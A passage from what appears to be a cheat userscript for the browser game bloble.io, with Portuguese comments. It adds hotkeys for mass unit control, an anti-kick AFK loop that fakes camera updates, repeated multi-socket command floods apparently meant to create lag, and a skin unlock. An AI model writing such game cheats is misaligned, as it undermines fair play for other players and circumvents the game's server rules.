a.push(units[d].id)
socket.emit("3", a)
}}}}
var sellwall;
for(var i=0,s=[],s2=[];i<units.length;++i){
if(units[i].owner==player.sid){
sellwall = UTILS.getDistance(player.x,player.y,units[i].x,units[i].y);
if(units[i].uPath==1){
if(UTILS.roundToTwo(sellwall)<300){
s.push(units[i].id);
socket.emit("3",s);
}}}}}
 
    window.upmicros=()=>{
    for (var i = 0; i < units.length; ++i) 3== units[i].type && "circle" == units[i].shape && units[i].owner == player.sid && socket.emit("4", units[i].id, 1)
    window.sockets.forEach(socket => {
          for (var i = 0; i < units.length; ++i) {
              if(3== units[i].type && "circle" == units[i].shape){
                  socket.emit("4", units[i].id, 1)
              }
          }
    })
}
 
 
 
 
//LAG111
 
 
 
 
/*
    var num_threads = 2;
var MT = new Multithread(num_threads);
 
    var funcInADifferentThread = MT.process(
  function(a, b) { return a + b; },
  function(r) { console.log(r) }
);
 
// Nothing has happened,
//funcInADifferentThread has not executed yet...
 
funcInADifferentThread(1, 2);
console.log('Before or after?');
 
// We now see "Before or after?" logged in the console,
// and "3" (= 1 + 2) logged shortly thereafter...
// it was running asynchronously
 
*/
 
 
 
 
 
window.movimentacao3=()=>{
 var trops3 = [];
             window.sock1 = socket
         window.sock2 = socket
    var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY;
            for (var b = 0; b < selUnits.length; ++b) {trops3.push(selUnits[b].id);}
    sock1.emit("5", a, d, trops3, 0, -1)
    sock1.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), trops3, 0, -1)
    sock2.emit("5", a, d, trops3, 0, -1)
    sock2.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), trops3, 0, -1)
    socket.emit("5", a, d, trops3, 0, -1)
    socket.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), trops3, 0, -1)
}
window.movimentacao2=()=>{
 var trops2 = [];
             window.sock1 = socket
         window.sock2 = socket
    var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY;
            for (var b = 0; b < selUnits.length; ++b) {trops2.push(selUnits[b].id);}
  sock1.emit("5", a, d, trops2, 0, -1)
    sock1.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), trops2, 0, -1)
    sock2.emit("5", a, d, trops2, 0, -1)
    sock2.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), trops2, 0, -1)
    socket.emit("5", a, d, trops2, 0, -1)
    socket.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), trops2, 0, -1)
}
window.movimentacao1=()=>{
 var trops = [];
             window.sock1 = socket
         window.sock2 = socket
    var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY;
            for (var b = 0; b < selUnits.length; ++b) {trops.push(selUnits[b].id);}
  sock1.emit("5", a, d, trops, 0, -1)
    sock1.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), trops, 0, -1)
    sock2.emit("5", a, d, trops, 0, -1)
    sock2.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), trops, 0, -1)
    socket.emit("5", a, d, trops, 0, -1)
    socket.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), trops, 0, -1)
/*
     for (var g = 0; g < ((selUnits.length/selUnits.length)+2); ++g) {
     movimentacao2()
       movimentacao3()
     }
*/
 
    var loop1=setInterval(function(){
         movimentacao2()
       setTimeout(function(){clearInterval(loop1);
 var loop2=setInterval(function(){
         movimentacao3()
       setTimeout(function(){clearInterval(loop2);},80)
    },70)
},80)
    },70)
 
 
}
 
 
 
 
//JUNTA TROPAS SEM LAG
window.juntarSemLag1 = function(){
    var e = [];
    var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY;
            for (var b = 0; b < selUnits.length; ++b) {e.push(selUnits[b].id);}
             socket.emit("5", a, d, e, 0, -1)
}
 
 
 
//SAVE E LOAD BASE
var loadedBase = [];
window.saveBase=function(userSid){
      var user = users[getUserBySID(userSid)];
    var base = [];
       for(var i=0;i<units.length;++i){
            if(units[i].owner == userSid && units[i].type!=1){
 
      var unit = units[i];
      var  dir1 = UTILS.getDirection(unit.x,unit.y,user.x,user.y),
           dst1 = UTILS.getDistance(user.x,user.y,unit.x,unit.y),
           uPath1 = unit.uPath;
    base.push({
        dir:dir1,
        dst:dst1,
        uPath:uPath1
})}}
     localStorage.setItem("base_"+prompt("Nome para salvar Base: "),JSON.stringify(base))
 
};
 
 
 
 
 
 
 
 
window.loadBase=function(){
    loadedBase = JSON.parse(localStorage.getItem("base_"+prompt("Nome para carregar a Base: ")))
}
 
window.buildLoadedBase=function(){
loadedBase.forEach((unit) => {
socket.emit("1",unit.dir,unit.dst,unit.uPath[0])
console.log("socket.emit('1', "+unit.dir+", "+unit.dst+", "+unit.uPath[0])+")"
})
}
 
//LIGA OS PLAYER(LINHA DO JOGO)
function playersLinked(a, d) {
    if (a.sid == player.sid && d.name.startsWith(player.name)) {
        return true;
    }
}
 
 
//LINK DA PARTIDA
window.linksparty = function() {
    alert("http://bloble.io/?l=" + partyKey)
};
 
 
//CONTROLA O MODO AFK
window.afke=function(){
    var texto = document.getElementById("afk");
if(afks){
afks=false;
texto.innerText="AFK: OFF"
clearInterval(afk1)
}else{
afks=true;
texto.innerText="AFK: ON"
window.afk1=setInterval(function(){
antkickkk()
},1000)
}
}
 
//ANT KICK
function antkickkk(){
     socket.emit("2", 0, 0);
     socket.emit("2", Math.round(camX), Math.round(camY));
     socket.emit("2",camX,camY);
}
//FIM DO ANT KICK
 
 
 
//SPAWNA COMMANDER
 
function spacoman(){
    socket.emit("4",0,0,1);
     if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
socket.emit("4",0,0,1);
    })
        selUnits = [];
        units.every((unit) => {
        if (unit.owner === player.sid && unit.type === 1) {
        if (!unit.info) unit.info = getUnitFromPath(unit.uPath);
        if (unit.info.name === 'Commander') {
        selUnits.push(unit)
        sessionStorage.setItem('', );
        return false;
}}
        return true;
});
        selUnitType = "Unit";
 
}
 
 
//FORMA UM CIRCULO COM AS TROPAS TAMANHO DO CIRCULO DE 700px
function effect1() {
    var radiuslenght = 700;
    var radius = radiuslenght;
    var x = player.x + targetDst * MathCOS(targetDir) + camX;
    var y = player.y + targetDst * MathSIN(targetDir) + camY;
    var interval = (Math.PI * 2) / selUnits.length;
    rot += 0.1;
    for (let i = 0; i < selUnits.length; i++) {
        socket.emit("5", x + (Math.cos(interval * i + rot) * radius), y + (Math.sin(interval * i + rot) * radius), [selUnits[i].id], 0, 0);
    };
 
};
 
var tdsuni = [];
//FORMA UM CIRCULO COM AS TROPAS TAMANHO DO CIRCULO DE 90px
function effect3() {
    var radiuslenght = 97;
    var radius = radiuslenght;
    var x = player.x;
    var y = player.y;
    var interval = (Math.PI * 2) / selUnits.length;
 
        rot += 0.05;
        for (let i = 0; i < selUnits.length; i++) {
        socket.emit("5", x + (Math.cos(interval * i + rot) * radius), y + (Math.sin(interval * i + rot) * radius), [tdsuni[i].id], 0, 0);
    };
};
 
//CIRCULO COM TAMANHO DEFINIDO PELO JOGADOR
function effect2() {
    var radiuslenght = prompt("Digite o tamanho do círculo:");
    var radius = radiuslenght;
    var x = player.x + targetDst * MathCOS(targetDir) + camX;
    var y = player.y + targetDst * MathSIN(targetDir) + camY;
    var interval = (Math.PI * 2) / selUnits.length;
    rot += 0.1;
    for (let i = 0; i < selUnits.length; i++) {
    socket.emit("5", x + (Math.cos(interval * i + rot) * radius), y + (Math.sin(interval * i + rot) * radius), [selUnits[i].id], 0, 0);
    };
};
 
 
 
 
window.testsid=function(){
    var ids = 0, nome='', tot=0, unisele = [], vida=0;
    ids = prompt("insira o id")
    users.forEach((user) => {
    if(user.sid==ids){
    nome=(user.name)
    vida=(user.size)
}
})
      units.forEach((unit) => {
      if(unit.owner==ids && unit.type === 1){
      unisele.push(unit)
      }
      })
      tot = unisele.length;
      addChat("O usuario: "+nome+" possue: "+tot+" tropas,"+" vida: "+vida+"%","Inteligencia")
}
 
function pegapos(){
     for(var i=0;i<selUnits.length;++i){
 addChat(selUnits.length,"inf")
      var unit = selUnits[i];
      var  dir1 = UTILS.getDirection(unit.x,unit.y,player.x,player.y),
           dst1 = UTILS.getDistance(player.x,player.y,unit.x,unit.y),
           uPath1 = unit.uPath;
 alert("dis: "+dir1+" dir: "+dst1+" uPath: "+uPath1)
 
}}
 
 
window.baati=1;
window.verybasea=function(){
if(baati==1){
window.basesat.b1()
}
if(baati==2){
window.basesat.b2()
}
if(baati==3){
window.basesat.b3()
}
if(baati==4){
window.basesat.b4()
}
if(baati==5){
window.basesat.b5()
}
if(baati==6){
window.basesat.b6()
}
if(baati==7){
dpk()
}
if(baati==21){
window.basesat.b21()
}
}
 
//EVENTOS AO PRECIONAR UMA TECLA
window.addEventListener("keypress",function(event){
if (document.activeElement == mainCanvas) {
 
if(event.key=="p" || event.keyCode==2){
 
if(lagsd == true){
 
movimentacao1()
 if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
        var trops = [];
        var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY;
        for (var b = 0; b < selUnits.length; ++b) {trops.push(selUnits[b].id);}
        trops.forEach((unit) => {
            socket.emit("5", a, d, trops, 0, -1),
            socket.emit("5", UTILS.roundToTwo(a),
            UTILS.roundToTwo(d),trops,0,-1),
            socket.emit("5", a, d, trops, -2, 2),
            socket.emit("5", UTILS.roundToTwo(a),
            UTILS.roundToTwo(d), trops,-1,1),
            socket.emit("5", a, d, trops, 0, -1),
            socket.emit("5", UTILS.roundToTwo(a),
            UTILS.roundToTwo(d),trops,0,-1),
            socket.emit("5", a, d, trops, 0, 0),
            socket.emit("5", UTILS.roundToTwo(a),
            UTILS.roundToTwo(d),trops,1,-1),
            socket.emit("5", a, d, trops, 0, -1),
            socket.emit("5", UTILS.roundToTwo(a),
            UTILS.roundToTwo(d),trops,0,-1)
        })
    })
}
 
 
 
 
 
 
 
 
if(lagsd == false){
 
juntarSemLag1()
     if (!window.sockets) return alert("no sockets");
            window.sockets.forEach(socket => {
 
                 var receb = [];
        var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY;
            for (var e = [], b = 0; b < selUnits.length; ++b) receb.push(selUnits[b].id);
            socket.emit("5",a,d, receb, 0, -1)
            })
        }
 
}
}
})
 
window.addEventListener("keydown", function(a) {
if(a.keyCode==2){
alert("mouse")
}
})
window.addEventListener("keydown", function(a) {
        if (document.activeElement == mainCanvas) {
 
        if(a.key == 'u'){
pegapos()
}
 
        if(a.key == 'y'){
testsid()
}
 
        if(a.key == 'g'){
selUnits.splice(0,2)
}
 
        if(a.key == '*'){
effect2()
}
        if(a.key == 'j'){
effect1()
}
 
        if(a.key == 'e'){
spacoman()
}
        if(a.key == 'q'){   // All troops except commander
        selUnits = [];
        units.forEach((unit) => {
        if (unit.owner === player.sid && unit.type === 1) {
        if (!unit.info) unit.info = getUnitFromPath(unit.uPath);
        unit.info.name !== 'Commander' && unit.info.name !== 'Siege Ram' &&selUnits.push(unit)
}});
        selUnitType = "Unit";
}
        else if(a.key == 'b'){   // All troops except commander
        selUnits = [];
        units.forEach((unit) => {
        if (unit.owner === player.sid && unit.type === 1) {
        if (!unit.info) unit.info = getUnitFromPath(unit.uPath);
        unit.info.name !== 'Siege Ram' &&selUnits.push(unit)
}});
        selUnitType = "Unit";
}
        if(a.key=="0"){
        if(lagsd){
        lagsd=false;
        sitlag = 'off'
}
        else{
        lagsd=true;
        sitlag = 'on'
}}
 
        if(a.keyCode==90){//Z
     verybasea()
        }
        if(a.keyCode==67){ //C
coloc()
        }
        if(a.keyCode==88){// X
        tirafull()
}
         if(a.keyCode==16){// shift
         upmicros()
         soldadoarmory()
         soldadoarmorY()
         UpgradeGreaterBarracks1()
}
         if(a.key=='h'){
         joinEnabled = !joinEnabled
         joinTroopsDiv.innerText = joinEnabled?("ON"):("OFF")
}}})
 
//FIM DOS EVENTOS AO PRECIONAR UMA TECLA
 
 
 
 
 
//ABRIR VARIAS GUIAS DO JOGO NO NAVEGADOR
cid = UTILS.getUniqueID();
localStorage.setItem("cid",cid);
//FIM DA SESSÃO
 
 
 
 
 
//jointroop1
var joinTroopsDiv = document.createElement("div")
joinTroopsDiv.id = "joinTroopContainer"
document.getElementById("statContainer").appendChild(joinTroopsDiv)
joinTroopsDiv.innerText = joinEnabled?("ON"):("OFF")
 
 
//MENU DA BASE
window.unlockSkins()
window.share.getBaseUpgrades=function(){
    return [{
            name: "Commander",
            desc: "Powerful commander unit",
            lockMaxBuy: true,
            cost: 1500,
            unitSpawn: 9
        },
        {
            name: "Salvar Base",
            desc: "Salvar Base, Para Poder Usar Em Qualquer Hora",
        },
        {
            name: "Carregar Base",
            desc: "Carregue Uma Base Salva Anteriormente",
        },
        {
            name: "Construir Base",
            desc: "Constroi Base Carregada",
        },
        {
            name: "Construir Automaticamente",
            desc: "Constroi Base Carregada Automaticamente"
        }
    ]
}
 
function upgradeSelUnits(firstUnit,upgrade){
    var firstUnitName = window.getUnitFromPath(firstUnit.uPath).name
    for(var i=0;i<window.selUnits.length;i++){
        var unit = window.selUnits[i]
        if(window.getUnitFromPath(unit.uPath).name==firstUnitName){
            window.socket.emit("4",unit.id,upgrade)
        }
    }
}
 
function handleActiveBaseUpgrade(sid,upgradeName) {
           if (upgradeName == "Salvar Base")
           {
           saveBase(sid)
           } else
           if (upgradeName == "Carregar Base")
           {
           loadBase()
           } else
           if (upgradeName == "Construir Base")
           {
           buildLoadedBase()
           } else
           if (upgradeName == "Construir Automaticamente")
           {
           autoBase()
           }
}
 
//FPS
var before,now,fps,fpsps;
before=Date.now();
fps=0;
requestAnimationFrame(
    function loop(){
        now=Date.now();
        fps=Math.round(1000/(now-before));
        before=now;
        requestAnimationFrame(loop);
 
    }
 );
 
  window.fpps = setInterval(function(){
            fpsps=fps
         document.getElementById("Fps").innerHTML = "Fps: "+fpsps
        },1000)
 
 
 
 
//FUNCOES DO JOGO
 
 
//JOINTROOP ON E OFF
 
 
updateGameLoop=function(a){if(player&&gameData){updateTarget();if(gameState&&mapBounds){if(camXS||camYS)camX+=camXS*cameraSpd*a,camY+=camYS*cameraSpd*a;player.x+camX<mapBounds[0]?camX=mapBounds[0]-player.x:player.x+camX>mapBounds[0]+mapBounds[2]&&(camX=mapBounds[0]+mapBounds[2]-player.x);player.y+camY<mapBounds[1]?camY=mapBounds[1]-player.y:player.y+camY>mapBounds[1]+mapBounds[3]&&(camY=mapBounds[1]+mapBounds[3]-player.y);
currentTime-lastCamSend>=sendFrequency&&(lastCamX!=camX||lastCamY!=camY)&&(lastCamX=camX,lastCamY=camY,lastCamSend=currentTime,socket.emit("2",Math.round(camX),Math.round(camY)))}renderBackground(outerColor);var d=(player.x||0)-maxScreenWidth/2+camX,c=(player.y||0)-maxScreenHeight/2+camY;mapBounds&&(mainContext.fillStyle=backgroundColor,mainContext.fillRect(mapBounds[0]-d,mapBounds[1]-c,mapBounds[2],mapBounds[3]));for(var b,g,e=0;e<units.length;++e)b=units[e],b.interpDst&&(g=b.interpDst*a*.015,b.interX+=
g*MathCOS(b.interpDir),b.interY+=g*MathSIN(b.interpDir),b.interpDst-=g,.1>=b.interpDst&&(b.interpDst=0,b.interX=b.interpDstS*MathCOS(b.interpDir),b.interY=b.interpDstS*MathSIN(b.interpDir))),b.speed&&(updateUnitPosition(b),b.x+=b.interX||0,b.y+=b.interY||0);var h,f;if(gameState)if(activeUnit){h=player.x-d+targetDst*MathCOS(targetDir)+camX;f=player.y-c+targetDst*MathSIN(targetDir)+camY;var k=UTILS.getDirection(h,f,player.x-d,player.y-c);0==activeUnit.type?(b=UTILS.getDistance(h,f,player.x-d,player.y-
c),b-activeUnit.size<player.startSize?(h=player.x-d+(activeUnit.size+player.startSize)*MathCOS(k),f=player.y-c+(activeUnit.size+player.startSize)*MathSIN(k)):b+activeUnit.size>player.buildRange-.15&&(h=player.x-d+(player.buildRange-activeUnit.size-.15)*MathCOS(k),f=player.y-c+(player.buildRange-activeUnit.size-.15)*MathSIN(k))):1==activeUnit.type||2==activeUnit.type?(h=player.x-d+(activeUnit.size+player.buildRange)*MathCOS(k),f=player.y-c+(activeUnit.size+player.buildRange)*MathSIN(k)):3==activeUnit.type&&
(b=UTILS.getDistance(h,f,player.x-d,player.y-c),b-activeUnit.size<player.startSize?(h=player.x-d+(activeUnit.size+player.startSize)*MathCOS(k),f=player.y-c+(activeUnit.size+player.startSize)*MathSIN(k)):b+activeUnit.size>player.buildRange+2*activeUnit.size&&(h=player.x-d+(player.buildRange+activeUnit.size)*MathCOS(k),f=player.y-c+(player.buildRange+activeUnit.size)*MathSIN(k)));activeUnitDir=k;activeUnitDst=UTILS.getDistance(h,f,player.x-d,player.y-c);activeUnit.dontPlace=!1;mainContext.fillStyle=
outerColor;if(0==activeUnit.type||2==activeUnit.type||3==activeUnit.type)for(e=0;e<units.length;++e)if(1!=units[e].type&&units[e].owner==player.sid&&0<=activeUnit.size+units[e].size-UTILS.getDistance(h,f,units[e].x-d,units[e].y-c)){mainContext.fillStyle=redColor;activeUnit.dontPlace=!0;break}renderCircle(h,f,activeUnit.range?activeUnit.range:activeUnit.size+30,mainContext,!0)}else if(selUnits.length)for(e=0;e<selUnits.length;++e)mainContext.fillStyle=outerColor,1<selUnits.length?renderCircle(selUnits[e].x-
d,selUnits[e].y-c,selUnits[e].size+25,mainContext,!0):renderCircle(selUnits[e].x-d,selUnits[e].y-c,selUnits[e].range?selUnits[e].range:selUnits[e].size+25,mainContext,!0);else activeBase&&(mainContext.fillStyle=outerColor,renderCircle(activeBase.x-d,activeBase.y-c,activeBase.size+50,mainContext,!0));if(selUnits.length)for(mainContext.strokeStyle=targetColor,e=0;e<selUnits.length;++e)selUnits[e].gatherPoint&&renderDottedCircle(selUnits[e].gatherPoint[0]-d,selUnits[e].gatherPoint[1]-c,30,mainContext);
for(e=0;e<users.length;++e)if(b=users[e],!b.dead){mainContext.lineWidth=1.2*outlineWidth;mainContext.strokeStyle=indicatorColor;isOnScreen(b.x-d,b.y-c,b.buildRange)&&(mainContext.save(),mainContext.translate(b.x-d,b.y-c),renderDottedCircle(0,0,b.buildRange,mainContext),renderDottedCircle(0,0,b.startSize,mainContext),mainContext.restore());b.spawnProt&&(mainContext.strokeStyle=redColor,mainContext.save(),mainContext.translate(b.x-d,b.y-c),
renderDottedCircle(0,0,b.buildRange+140,mainContext),mainContext.restore());for(var m=0;m<users.length;++m)e<m&&!users[m].dead&&(mainContext.strokeStyle=b.spawnProt||users[m].spawnProt?redColor:indicatorColor,playersLinked(b,users[m])&&(isOnScreen(b.x-d,b.y-c,0)||isOnScreen(users[m].x-d,users[m].y-c,0)||isOnScreen((b.x+users[m].x)/2-d,(b.y+users[m].y)/2-c,0))&&(g=UTILS.getDirection(b.x,b.y,users[m].x,users[m].y),renderDottedLine(b.x-(b.buildRange+lanePad+(b.spawnProt?140:0))*MathCOS(g)-d,b.y-(b.buildRange+
lanePad+(b.spawnProt?140:0))*MathSIN(g)-c,users[m].x+(users[m].buildRange+lanePad+(users[m].spawnProt?140:0))*MathCOS(g)-d,users[m].y+(users[m].buildRange+lanePad+(users[m].spawnProt?140:0))*MathSIN(g)-c,mainContext)))}mainContext.strokeStyle=darkColor;mainContext.lineWidth=1.2*outlineWidth;for(e=0;e<units.length;++e)b=units[e],b.layer||(b.onScreen=!1,isOnScreen(b.x-d,b.y-c,b.size)&&(b.onScreen=!0,renderUnit(b.x-d,b.y-c,b.dir,b,playerColors[b.color],mainContext)));for(e=0;e<units.length;++e)b=units[e],
1==b.layer&&(b.onScreen=!1,isOnScreen(b.x-d,b.y-c,b.size)&&(b.onScreen=!0,renderUnit(b.x-d,b.y-c,b.dir,b,playerColors[b.color],mainContext)));mainContext.fillStyle=bulletColor;for(e=bullets.length-1;0<=e;--e){b=bullets[e];if(b.speed&&(b.x+=b.speed*a*MathCOS(b.dir),b.y+=b.speed*a*MathSIN(b.dir),UTILS.getDistance(b.sX,b.sY,b.x,b.y)>=b.range)){bullets.splice(e,1);continue}isOnScreen(b.x-d,b.y-c,b.size)&&renderCircle(b.x-d,b.y-c,b.size,mainContext)}mainContext.strokeStyle=darkColor;mainContext.lineWidth=
1.2*outlineWidth;for(e=0;e<users.length;++e)b=users[e],!b.dead&&isOnScreen(b.x-d,b.y-c,b.size)&&(renderPlayer(b,b.x-d,b.y-c,mainContext),"unknown"!=b.name&&(tmpIndx=b.name+"-"+b.size,20<=b.size&&b.nameSpriteIndx!=tmpIndx&&(b.nameSpriteIndx=tmpIndx,b.nameSprite=renderText(b.name,b.size/4)),b.nameSprite&&mainContext.drawImage(b.nameSprite,b.x-d-b.nameSprite.width/2,b.y-c-b.nameSprite.height/2,b.nameSprite.width,b.nameSprite.height)));if(selUnits.length)for(e=selUnits.length-1;0<=e;--e)selUnits[e]&&
0>units.indexOf(selUnits[e])&&disableSelUnit(e);activeUnit&&renderUnit(h,f,k,activeUnit,playerColors[player.color],mainContext);showSelector&&(mainContext.fillStyle="rgba(255, 255, 255, 0.1)",h=player.x-d+targetDst*MathCOS(targetDir)+camX,f=player.y-c+targetDst*MathSIN(targetDir)+camY,mainContext.fillRect(mouseStartX,mouseStartY,h-mouseStartX,f-mouseStartY));playerBorderRot+=a/5600;hoverUnit?toggleUnitInfo(hoverUnit):activeBase?toggleUnitInfo(activeBase,true):activeUnit?toggleUnitInfo(activeUnit):
0<selUnits.length?toggleUnitInfo(selUnits[0].info,!0):toggleUnitInfo()}};
renderText=function(a, d) { var c = document.createElement("canvas") , b = c.getContext("2d"); b.font = d + "px regularF"; var g = b.measureText(a); c.width = g.width + 20; c.height = 2 * d; b.translate(c.width / 2, c.height / 2); b.font = d + "px regularF"; b.fillStyle = "#00e1ff"; b.textBaseline = "middle"; b.textAlign = "center"; b.strokeStyle = '#001044'; b.lineWidth = outlineWidth; b.strokeText(a, 0, 0); b.fillText(a, 0, 0); return c }
 
 
 
//FUNCAO DO JOGO
setupSocket = function() {
    socket.on("connect_error", function() { lobbyURLIP ? kickPlayer("Connection failed. Please check your lobby ID") : kickPlayer("Connection failed. Check your internet and firewall settings") });
    socket.on("disconnect", function(a) { kickPlayer("Disconnected.") });
    socket.on("error", function(a) { kickPlayer("Disconnected. The server may have updated.") });
    socket.on("kick", function(a) { kickPlayer(a) });
    socket.on("lk", function(a) { partyKey = a });
    socket.on("spawn", function() {
        gameState = 1;
        unitList = share.getUnitList();
        resetCamera();
        toggleMenuUI(!1);
        toggleGameUI(!0);
        updateUnitList();
        player.upgrades = share.getBaseUpgrades();
        mainCanvas.focus()
    });
    socket.on("gd", function(a) { gameData = a });
    socket.on("mpd", function(a) { mapBounds = a });
    socket.on("ch", function(a, d, c) { addChatLine(a, d, c) });
    socket.on("setUser", function(a, d) {
        if (a && a[0]) {
                var c = getUserBySID(a[0]),
                b = {
                    sid: a[0],
                    name: a[1],
                    iName: "Headquarters",
                    upgrades: [window.share.getBaseUpgrades()[1]],
                    dead: !1,
                    color: a[2],
                    size: a[3],
                    startSize: a[4],
                    x: a[5],
                    y: a[6],
                    buildRange: a[7],
                    gridIndex: a[8],
                    spawnProt: a[9],
                    skin: a[10],
                    desc: "Base of operations of " + a[1] + "<br>" + "Life: " + a[3] + "%" + " ID:" + a[0],
                    kills: 10,
                    typeName: "Base"
                };
            null != c ? (users[c] = b, d && (player = users[c])) : (users.push(b), d && (player = users[users.length - 1]))
        }
    });
    socket.on("klUser", function(a) {
        var d = getUserBySID(a);
        null != d && (users[d].dead = !0);
        player && player.sid == a && (hideMainMenuText(), leaveGame())
    });
    socket.on("delUser", function(a) {
        a = getUserBySID(a);
        null != a && users.splice(a, 1)
    });
    socket.on("au", function(a) {
        a && (units.push({
            id: a[0],
            owner: a[1],
            uPath: a[2] || 0,
            type: a[3] || 0,
            color: a[4] || 0,
            paths: a[5],
            x: a[6] || 0,
            sX: a[6] || 0,
            y: a[7] || 0,
            sY: a[7] || 0,
            dir: a[8] ||
                0,
            turRot: a[8] || 0,
            speed: a[9] || 0,
            renderIndex: a[10] || 0,
            turretIndex: a[11] || 0,
            range: a[12] || 0,
            cloak: a[13] || 0
        }), units[units.length - 1].speed && (units[units.length - 1].startTime = window.performance.now()), a = getUnitFromPath(units[units.length - 1].uPath)) && (units[units.length - 1].size = a.size, units[units.length - 1].shape = a.shape, units[units.length - 1].layer = a.layer, units[units.length - 1].renderIndex || (units[units.length - 1].renderIndex = a.renderIndex), units[units.length - 1].range || (units[units.length - 1].range = a.range),
            units[units.length - 1].turretIndex || (units[units.length - 1].turretIndex = a.turretIndex), units[units.length - 1].iSize = a.iSize)
    });
    socket.on("spa", function(a, d, c, b) {
        a = getUnitById(a);
        if (null != a) {
            var g = UTILS.getDistance(d, c, units[a].x || d, units[a].y || c);
            300 > g && g ? (units[a].interpDst = g, units[a].interpDstS = g, units[a].interpDir = UTILS.getDirection(d, c, units[a].x || d, units[a].y || c)) : (units[a].interpDst = 0, units[a].interpDstS = 0, units[a].interpDir = 0, units[a].x = d, units[a].y = c);
            units[a].interX = 0;
            units[a].interY = 0;
            units[a].sX =
                units[a].x || d;
            units[a].sY = units[a].y || c;
            b[0] && (units[a].dir = b[0], units[a].turRot = b[0]);
            units[a].paths = b;
            units[a].startTime = window.performance.now()
        }
    });
    socket.on("uc", function(a, d) {
        unitList && (unitList[a].count = d);
        forceUnitInfoUpdate = !0
    });
    socket.on("uul", function(a, d) { unitList && (unitList[a].limit += d) });
    socket.on("rpu", function(a, d) {
        var c = getUnitFromPath(a);
        c && (c.dontShow = d, forceUnitInfoUpdate = !0)
    });
    socket.on("sp", function(a, d) {
        var c = getUserBySID(a);
        null != c && (users[c].spawnProt = d)
    });
    socket.on("ab", function(a) {
        a &&
            bullets.push({ x: a[0], sX: a[0], y: a[1], sY: a[1], dir: a[2], speed: a[3], size: a[4], range: a[5] })
    });
    socket.on("uu", function(a, d) {
        if (void 0 != a && d) {
            var c = getUnitById(a);
            if (null != c)
                for (var b = 0; b < d.length;) units[c][d[b]] = d[b + 1], "dir" == d[b] && (units[c].turRot = d[b + 1]), b += 2
        }
    });
    socket.on("du", function(a) {
        a = getUnitById(a);
        null != a && units.splice(a,1)
    });
    socket.on("sz", function(a, d) {
        var c = getUserBySID(a);
        null != c && (users[c].size = d)
    });
    socket.on("pt", function(a) { scoreContainer.innerHTML = "Lag: "+ sitlag + "<br>" + "Life: " + player.size + "%" + "<br>"+ "Players On: " + users.length + "<br>" + "Power: <span id=poderb class='greyMenuText'>" + a });
   socket.on("l", function(a) {
        for (var d = "", c = 1, b = 0; b < a.length;) d += "<div class='leaderboardItem' font-family:'-webkit-pictograph'><div style='display:inline-block;float:left;' class='whiteText'>" + c + ".</div> <div class='" + (player && a[b] == player.sid ? "leaderYou" : "leader") + "'>" + a[b + 1] + "</div><div class='scoreText'>" + a[b + 2] + "</div></div>", c++, b += 3;
        leaderboardList.innerHTML = d
    })
}
 
 
upgradeUnit=function(a){socket&&gameState&&(1==selUnits.length?socket.emit("4",selUnits[0].id,a):(activeBase)?(a==0&&activeBase.sid==player.sid?(socket.emit("4",0,a,1)):(handleActiveBaseUpgrade(activeBase.sid,activeBase.upgrades[a].name))):(upgradeSelUnits(selUnits[0],a)))}
 
 
window.toggleUnitInfo=function(a,d){var c="";a&&a.uPath&&(c=void 0!=a.group?a.group:a.uPath[0],c=unitList[c].limit?(unitList[c].count||0)+"/"+unitList[c].limit:"");if(a&&(forceUnitInfoUpdate||"block"!=unitInfoContainer.style.display||unitInfoName.innerHTML!=(a.iName||a.name)||lastCount!=c)){forceUnitInfoUpdate=!1;unitInfoContainer.style.display="block";unitInfoName.innerHTML=a.iName||a.name;a.cost?(unitInfoCost.innerHTML="Cost "+a.cost,unitInfoCost.style.display="block"):unitInfoCost.style.display="none";
unitInfoDesc.innerHTML=a.desc;unitInfoType.innerHTML=a.typeName;var b=a.space;lastCount=c;c='<span style="color:#fff">'+c+"</span>";unitInfoLimit.innerHTML=b?'<span><i class="material-icons" style="vertical-align: top; font-size: 20px;">&#xE7FD;</i>'+b+"</span> "+c:c;unitInfoUpgrades.innerHTML="";if(d&&a.upgrades){for(var g,e,h,f,k,c=0;c<a.upgrades.length;++c)(function(b){g=a.upgrades[b];var c=!0;g.lockMaxBuy&&void 0!=g.unitSpawn&&(unitList[g.unitSpawn].count||0)>=(unitList[g.unitSpawn].limit||0)?
c=!1:g.dontShow&&(c=!1);c&&(e=document.createElement("div"),e.className="upgradeInfo",h=document.createElement("div"),h.className="unitInfoName",h.innerHTML=g.name,e.appendChild(h),f=document.createElement("div"),f.className="unitInfoCost",g.cost?(f.innerHTML="Cost "+g.cost,e.appendChild(f)):(null),k=document.createElement("div"),k.id="upgrDesc"+b,k.className="unitInfoDesc",k.innerHTML=g.desc,k.style.display="none",e.appendChild(k),e.onmouseover=function(){document.getElementById("upgrDesc"+b).style.display="block"},
e.onmouseout=function(){document.getElementById("upgrDesc"+b).style.display="none"},e.onclick=function(){upgradeUnit(b);mainCanvas.focus()},unitInfoUpgrades.appendChild(e))})(c);g=e=h=f=k=null}}else a||(unitInfoContainer.style.display="none")}
 
 
 
//MURUS
function coloc(){
    window.objwall=[]
    objwall=[
        parede={
 coamdnos: socket.emit("1", -1.06, 310, 1),
 coamdnos: socket.emit("1", -2.08, 310, 1),
       coamdnos:    socket.emit("1", -0.64, 310, 1),
       coamdnos:       socket.emit("1", -2.5, 310, 1),
         coamdnos: socket.emit("1", -1.87, 306, 1),
